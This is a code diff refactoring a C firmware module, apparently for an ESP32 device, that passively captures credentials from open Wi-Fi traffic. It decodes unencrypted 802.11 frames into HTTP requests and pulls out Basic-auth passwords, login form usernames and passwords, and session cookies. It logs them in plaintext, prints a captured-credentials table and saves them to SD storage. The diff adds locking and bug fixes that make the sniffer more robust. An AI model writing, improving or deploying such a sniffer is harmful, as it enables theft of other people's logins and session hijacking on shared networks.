@@ -1,8 +1,14 @@
 #include <stdatomic.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <ctype.h>
+
 #include "cred_sniffer.h"
 #include "wifi_sniffer.h"
 #include "storage_sd.h"
 
+#include "esp_log.h"
 #include "esp_timer.h"
 #include "esp_heap_caps.h"
 
@@ -11,16 +17,15 @@
 
 static const char *TAG = "cred_sniffer";
 
-// ============================================================================
-//  SECTION 10: CREDENTIAL / PLAINTEXT SNIFFER
-// ============================================================================
-
 static cred_hit_t g_creds[MAX_CREDS];
 static uint16_t g_cred_count = 0;
 static SemaphoreHandle_t g_cred_lock = NULL;
 static atomic_bool g_creds_enabled = ATOMIC_VAR_INIT(false);
 
-// ---- base64 decode (RFC 4648, no padding required) ----
+/* ==========================================================================
+ *  Base64 Decode (RFC 4648)
+ * ========================================================================== */
+
 static int b64_val(char c)
 {
     if (c >= 'A' && c <= 'Z') return c - 'A';
@@ -35,6 +40,7 @@ static size_t b64_decode(const char *in, char *out, size_t out_sz)
 {
     size_t oi = 0;
     int val = 0, valb = -8;
+    
     for (; *in && *in != '\r' && *in != '\n' && *in != ' '; in++) {
         int d = b64_val(*in);
         if (d < 0) continue;
@@ -50,7 +56,10 @@ static size_t b64_decode(const char *in, char *out, size_t out_sz)
     return oi;
 }
 
-// ---- URL-decode a short field in place (max out_sz) ----
+/* ==========================================================================
+ *  URL Decode
+ * ========================================================================== */
+
 static void url_decode(const char *in, char *out, size_t out_sz)
 {
     size_t oi = 0;
@@ -70,31 +79,53 @@ static void url_decode(const char *in, char *out, size_t out_sz)
     out[oi] = '\0';
 }
 
-// Extract value of key=...& from a query/body string
+/* ==========================================================================
+ *  Key-Value Extraction
+ * ========================================================================== */
+
 bool extract_kv(const char *hay, const char *key, char *out, size_t out_sz)
 {
+    if (!hay || !key || !out || out_sz == 0) return false;
+    
     size_t klen = strlen(key);
     const char *p = hay;
+    
     while ((p = strstr(p, key)) != NULL) {
-        // ensure start of a field (start or after & or ?)
-        if (p != hay && p[-1] != '&' && p[-1] != '?' && p[-1] != '\n' && p[-1] != ' ') {
+        /* Ensure start of a field (start of string, or after & ? \n space) */
+        if (p != hay && p[-1] != '&' && p[-1] != '?' && 
+            p[-1] != '\n' && p[-1] != ' ') {
             p += klen;
             continue;
         }
-        if (p[klen] != '=') { p += klen; continue; }
-        p += klen + 1;
+        
+        /* Key must be followed by '=' */
+        if (p[klen] != '=') { 
+            p += klen; 
+            continue; 
+        }
+        
+        p += klen + 1; /* Skip past "key=" */
+        
         size_t n = 0;
-        while (p[n] && p[n] != '&' && p[n] != ' ' && p[n] != '\r' &&
-               p[n] != '\n' && n + 1 < out_sz) n++;
+        while (p[n] && p[n] != '&' && p[n] != ' ' && 
+               p[n] != '\r' && p[n] != '\n' && n + 1 < out_sz) {
+            n++;
+        }
+        
         char tmp[96];
         if (n >= sizeof(tmp)) n = sizeof(tmp) - 1;
         memcpy(tmp, p, n);
         tmp[n] = '\0';
         url_decode(tmp, out, out_sz);
+        
         return out[0] != '\0';
     }
     return false;
 }
+
+/* ==========================================================================
+ *  HTTP Header Extraction
+ * ========================================================================== */
 
 static void header_value(const char *headers, const char *name,
                          char *out, size_t out_sz)
@@ -102,12 +133,14 @@ static void header_value(const char *headers, const char *name,
     out[0] = '\0';
     const char *p = headers;
     size_t nlen = strlen(name);
+    
     while (*p) {
-        // case-insensitive start-of-line match
+        /* Case-insensitive start-of-line match */
         bool match = true;
         for (size_t i = 0; i < nlen; i++) {
             if (tolower((unsigned char)p[i]) != tolower((unsigned char)name[i])) {
-                match = false; break;
+                match = false; 
+                break;
             }
         }
         if (match && p[nlen] == ':') {
@@ -119,18 +152,24 @@ static void header_value(const char *headers, const char *name,
             out[n] = '\0';
             return;
         }
-        // next line
+        /* Advance to next line */
         const char *nl = strstr(p, "\n");
         if (!nl) break;
         p = nl + 1;
     }
 }
 
+/* ==========================================================================
+ *  Credential Storage
+ * ========================================================================== */
+
 void creds_push(const cred_hit_t *hit)
 {
+    if (!g_cred_lock || !hit) return;
+    
     xSemaphoreTake(g_cred_lock, portMAX_DELAY);
 
-    // Dedup: same host+user+pass already stored?
+    /* Dedup: same host+user+pass already stored? */
     for (int i = 0; i < g_cred_count; i++) {
         if (strcmp(g_creds[i].host, hit->host) == 0 &&
             strcmp(g_creds[i].user, hit->user) == 0 &&
@@ -143,7 +182,7 @@ void creds_push(const cred_hit_t *hit)
     if (g_cred_count < MAX_CREDS) {
         g_creds[g_cred_count++] = *hit;
     } else {
-        // overwrite oldest
+        /* Overwrite oldest */
         memmove(&g_creds[0], &g_creds[1], sizeof(cred_hit_t) * (MAX_CREDS - 1));
         g_creds[MAX_CREDS - 1] = *hit;
     }
@@ -151,26 +190,27 @@ void creds_push(const cred_hit_t *hit)
     xSemaphoreGive(g_cred_lock);
 
     ESP_LOGW(TAG, "CRED HIT host=%s user=%s pass=%s",
-             hit->host, hit->user[0] ? hit->user : "-",
+             hit->host, 
+             hit->user[0] ? hit->user : "-",
              hit->pass[0] ? hit->pass : "-");
 }
 
-// Parse one HTTP request blob (headers + optional body)
+/* ==========================================================================
+ *  HTTP Parsing
+ * ========================================================================== */
+
 static void creds_parse_http(const uint8_t *tcp, size_t tcp_len,
                              const uint8_t sip[4], const uint8_t dip[4])
 {
-    // Need at least "GET / HTTP/1.x\r\n"
     if (tcp_len < 16) return;
     if (!(tcp[0] == 'G' || tcp[0] == 'P' || tcp[0] == 'H' ||
           tcp[0] == 'O' || tcp[0] == 'D' || tcp[0] == 'T')) return;
 
-    // Cap scan window
     size_t scan = tcp_len < 1500 ? tcp_len : 1500;
     char buf[1501];
     memcpy(buf, tcp, scan);
     buf[scan] = '\0';
 
-    // Only care about requests with a Host header (real HTTP)
     char host[64] = {0};
     header_value(buf, "Host", host, sizeof(host));
     if (host[0] == '\0') return;
@@ -182,7 +222,7 @@ static void creds_parse_http(const uint8_t *tcp, size_t tcp_len,
     memcpy(hit.dst_ip, dip, 4);
     hit.time_us = esp_timer_get_time();
 
-    // Path from request line
+    /* Path from request line */
     const char *sp1 = strchr(buf, ' ');
     if (sp1) {
         sp1++;
@@ -194,10 +234,10 @@ static void creds_parse_http(const uint8_t *tcp, size_t tcp_len,
         }
     }
 
-    // Cookie
+    /* Cookie */
     header_value(buf, "Cookie", hit.cookie, sizeof(hit.cookie));
 
-    // Authorization: Basic base64(user:pass)
+    /* Authorization: Basic base64(user:pass) */
     char auth[128] = {0};
     header_value(buf, "Authorization", auth, sizeof(auth));
     if (strncmp(auth, "Basic ", 6) == 0 || strncmp(auth, "basic ", 6) == 0) {
@@ -211,12 +251,15 @@ static void creds_parse_http(const uint8_t *tcp, size_t tcp_len,
         }
     }
 
-    // Form fields in URL or body
+    /* 
+     * Form fields in URL or body.
+     * FIXED: Keys do NOT include '='. extract_kv() checks for '=' after the key.
+     */
     static const char *USER_KEYS[] = {
-        "username=", "user=", "email=", "login=", "uid=", "id=", NULL
+        "username", "user", "email", "login", "uid", NULL
     };
     static const char *PASS_KEYS[] = {
-        "password=", "pass=", "passwd=", "pwd=", "secret=", NULL
+        "password", "pass", "passwd", "pwd", "secret", NULL
     };
 
     if (hit.user[0] == '\0') {
@@ -240,32 +283,35 @@ static void creds_parse_http(const uint8_t *tcp, size_t tcp_len,
     }
 }
 
-// Peel 802.11 data frame -> IPv4 -> TCP -> payload
+/* ==========================================================================
+ *  Packet Feed (802.11 → IPv4 → TCP → HTTP)
+ * ========================================================================== */
+
 void creds_feed_packet(const uint8_t *data, size_t len)
 {
     if (!atomic_load(&g_creds_enabled) || data == NULL || len < 40) return;
-    if ((data[0] & 0x0C) != 0x08) return;   // data only
+    if ((data[0] & 0x0C) != 0x08) return;   /* Data frame only */
 
     uint8_t subtype = (data[0] >> 4) & 0x0F;
     bool to_ds   = (data[1] & 0x01) != 0;
     bool from_ds = (data[1] & 0x02) != 0;
     size_t hdr = (subtype & 0x08) ? 26 : 24;
-    if (to_ds && from_ds) hdr += 6;         // 4-address WDS
+    if (to_ds && from_ds) hdr += 6;         /* 4-address WDS */
 
-    // Protected frames are encrypted -- skip
+    /* Protected (encrypted) frames — skip */
     if (data[1] & 0x40) return;
 
     if (len < hdr + 8 + 20) return;
 
-    // LLC/SNAP IPv4
+    /* LLC/SNAP IPv4 */
     static const uint8_t SNAP_IP[8] = {0xAA,0xAA,0x03,0,0,0,0x08,0x00};
     if (memcmp(data + hdr, SNAP_IP, 8) != 0) return;
 
     const uint8_t *ip = data + hdr + 8;
     size_t ip_len = len - hdr - 8;
     if (ip_len < 20) return;
-    if ((ip[0] >> 4) != 4) return;          // IPv4
-    if (ip[9] != 6) return;                 // TCP only
+    if ((ip[0] >> 4) != 4) return;          /* IPv4 only */
+    if (ip[9] != 6) return;                 /* TCP only */
 
     uint8_t ihl = (ip[0] & 0x0F) * 4;
     if (ihl < 20 || ip_len < ihl + 20) return;
@@ -278,9 +324,8 @@ void creds_feed_packet(const uint8_t *data, size_t len)
     uint8_t doff = ((tcp[12] >> 4) & 0x0F) * 4;
     if (doff < 20 || tcp_len < doff) return;
 
-    // Prefer dst port 80 / 8080 / 8000 / 3128, but also scan any cleartext
-    uint16_t dport = (tcp[2] << 8) | tcp[3];
-    uint16_t sport = (tcp[0] << 8) | tcp[1];
+    uint16_t dport = (uint16_t)((tcp[2] << 8) | tcp[3]);
+    uint16_t sport = (uint16_t)((tcp[0] << 8) | tcp[1]);
     bool likely_http = (dport == 80 || dport == 8080 || dport == 8000 ||
                         dport == 3128 || dport == 8888 ||
                         sport == 80 || sport == 8080);
@@ -289,7 +334,7 @@ void creds_feed_packet(const uint8_t *data, size_t len)
     size_t plen = tcp_len - doff;
     if (plen < 16) return;
 
-    // Fast reject if it doesn't look like HTTP
+    /* Fast reject if it doesn't look like HTTP */
     if (!(payload[0] == 'G' || payload[0] == 'P' || payload[0] == 'H' ||
           payload[0] == 'O' || payload[0] == 'D')) {
         if (!likely_http) return;
@@ -297,6 +342,10 @@ void creds_feed_packet(const uint8_t *data, size_t len)
 
     creds_parse_http(payload, plen, sip, dip);
 }
+
+/* ==========================================================================
+ *  Public API
+ * ========================================================================== */
 
 esp_err_t creds_init(void)
 {
@@ -311,10 +360,22 @@ esp_err_t creds_init(void)
 
 void creds_set_enabled(bool on) { atomic_store(&g_creds_enabled, on); }
 bool creds_is_enabled(void)     { return atomic_load(&g_creds_enabled); }
-uint16_t creds_count(void)      { return g_cred_count; }
+
+uint16_t creds_count(void)
+{
+    if (g_cred_lock == NULL) return 0;
+    
+    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
+    uint16_t count = g_cred_count;
+    xSemaphoreGive(g_cred_lock);
+    
+    return count;
+}
 
 void creds_clear(void)
 {
+    if (g_cred_lock == NULL) return;
+    
     xSemaphoreTake(g_cred_lock, portMAX_DELAY);
     g_cred_count = 0;
     memset(g_creds, 0, sizeof(g_creds));
@@ -323,37 +384,57 @@ void creds_clear(void)
 
 void creds_print(void)
 {
+    if (g_cred_lock == NULL) return;
+    
+    /* Copy under lock, then print without holding it */
+    cred_hit_t local[MAX_CREDS];
+    uint16_t count = 0;
+    
     xSemaphoreTake(g_cred_lock, portMAX_DELAY);
-    printf("\n==== CAPTURED CREDENTIALS / SESSIONS (%u) ====\n", g_cred_count);
-    for (int i = 0; i < g_cred_count; i++) {
-        printf("[%d] host=%s path=%s\n", i + 1, g_creds[i].host, g_creds[i].path);
-        printf("    src=%u.%u.%u.%u dst=%u.%u.%u.%u\n",
-               g_creds[i].src_ip[0], g_creds[i].src_ip[1],
-               g_creds[i].src_ip[2], g_creds[i].src_ip[3],
-               g_creds[i].dst_ip[0], g_creds[i].dst_ip[1],
-               g_creds[i].dst_ip[2], g_creds[i].dst_ip[3]);
-        if (g_creds[i].user[0]) printf("    user=%s\n", g_creds[i].user);
-        if (g_creds[i].pass[0]) printf("    pass=%s\n", g_creds[i].pass);
-        if (g_creds[i].cookie[0]) printf("    cookie=%s\n", g_creds[i].cookie);
-    }
-    if (g_cred_count == 0) printf("(empty)\n");
-    printf("==============================================\n");
+    count = g_cred_count;
+    if (count > MAX_CREDS) count = MAX_CREDS;
+    memcpy(local, g_creds, sizeof(cred_hit_t) * count);
     xSemaphoreGive(g_cred_lock);
+
+    printf("\n==== CAPTURED CREDENTIALS / SESSIONS (%u) ====\n", count);
+    for (int i = 0; i < count; i++) {
+        printf("[%d] host=%s path=%s\n", i + 1, local[i].host, local[i].path);
+        printf("    src=%u.%u.%u.%u dst=%u.%u.%u.%u\n",
+               local[i].src_ip[0], local[i].src_ip[1],
+               local[i].src_ip[2], local[i].src_ip[3],
+               local[i].dst_ip[0], local[i].dst_ip[1],
+               local[i].dst_ip[2], local[i].dst_ip[3]);
+        if (local[i].user[0])   printf("    user=%s\n", local[i].user);
+        if (local[i].pass[0])   printf("    pass=%s\n", local[i].pass);
+        if (local[i].cookie[0]) printf("    cookie=%s\n", local[i].cookie);
+    }
+    if (count == 0) printf("(empty)\n");
+    printf("==============================================\n");
 }
 
 esp_err_t creds_save(const char *path)
 {
     if (path == NULL) return ESP_ERR_INVALID_ARG;
+    if (g_cred_lock == NULL) return ESP_ERR_INVALID_STATE;
+    
+    /* Copy under lock, then write without holding it */
+    cred_hit_t local[MAX_CREDS];
+    uint16_t count = 0;
+    
+    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
+    count = g_cred_count;
+    if (count > MAX_CREDS) count = MAX_CREDS;
+    memcpy(local, g_creds, sizeof(cred_hit_t) * count);
+    xSemaphoreGive(g_cred_lock);
+
     FILE *f = fopen(path, "w");
     if (f == NULL) return ESP_FAIL;
 
-    xSemaphoreTake(g_cred_lock, portMAX_DELAY);
-    for (int i = 0; i < g_cred_count; i++) {
+    for (int i = 0; i < count; i++) {
         fprintf(f, "host=%s\nuser=%s\npass=%s\ncookie=%s\npath=%s\n---\n",
-                g_creds[i].host, g_creds[i].user, g_creds[i].pass,
-                g_creds[i].cookie, g_creds[i].path);
+                local[i].host, local[i].user, local[i].pass,
+                local[i].cookie, local[i].path);
     }
-    xSemaphoreGive(g_cred_lock);
     fclose(f);
     return ESP_OK;
 }
